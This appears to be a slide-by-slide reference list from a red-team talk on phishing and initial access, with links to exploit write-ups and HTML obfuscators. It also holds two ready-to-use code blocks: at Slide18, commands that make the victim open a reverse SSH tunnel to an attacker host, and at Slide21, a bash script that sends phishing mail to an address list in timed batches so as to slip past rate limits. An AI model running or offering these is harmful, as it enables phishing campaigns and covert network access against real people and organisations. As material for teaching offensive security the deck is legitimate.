Slide6:
https://www.exim.org/exim-html-current/doc/html/spec_html/ch-building_and_installing_exim.html
https://www.aapanel.com/docs/#/3?page_id=178

Slide13:
https://x.com/CICADA8Research/status/1865676412444967384

Slide14-15:
https://vk.com/video-221945088_456239438

Slide16:
https://www.rbtsec.com/blog/cve-2024-21320-windows-themes-spoofing-vulnerability-walkthrough/
https://blog.0patch.com/2024/10/we-patched-cve-2024-38030-found-another.html

Slide17:
https://link.springer.com/article/10.1007/s10207-021-00548-5
https://posts.specterops.io/phishing-with-dynamite-7d33d8fac038

Slide18:
https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/
https://badoption.eu/blog/2023/09/28/ZipLink.html

```shell
attacker> sudo /etc/init.d/ssh start
attacker> useradd -M -N -d /dev/null -s /bin/false proxy
attacker> passwd proxy
victim> ssh proxy@attacker -N -R 1337
```

Slide21:

```shell
#!/bin/bash

EMAILS_FILE="emails.txt"

SENDMAIL_CMD='cat ./msg.txt | sendemail -f "Служба фишинга <task@pohek.ru>" -t "<email>" -u "Ломаем" -s smtp.phish:123 -xu user -xp password -o message-charset=utf-8'

if [[ ! -f "$EMAILS_FILE" ]]; then
    echo "File $EMAILS_FILE not found!"
    exit 1
fi

emails=($(cat "$EMAILS_FILE"))
emails_count=${#emails[@]}

batch_size=50    # Число адресатов за раз
interval=600     # Интервал в секундах (10 минут)

current_index=0
while [[ $current_index -lt $emails_count ]]; do

    batch_emails=("${emails[@]:$current_index:$batch_size}")
    
    echo "Sending next block email'ов (${current_index} - $((current_index + batch_size - 1))):"
    
    for email in "${batch_emails[@]}"; do
        eval "${SENDMAIL_CMD/<email>/$email}"
        echo "Sending mail to $email"
    done

    current_index=$((current_index + batch_size))
    
    if [[ $current_index -lt $emails_count ]]; then
        echo "Waiting $((interval / 60)) minutes before next sending..."
        sleep $interval
    fi
done

echo "Success!"
```

Slide22:
https://github.com/BinBashBanana/html-obfuscator
https://github.com/keklick1337/StealthHTML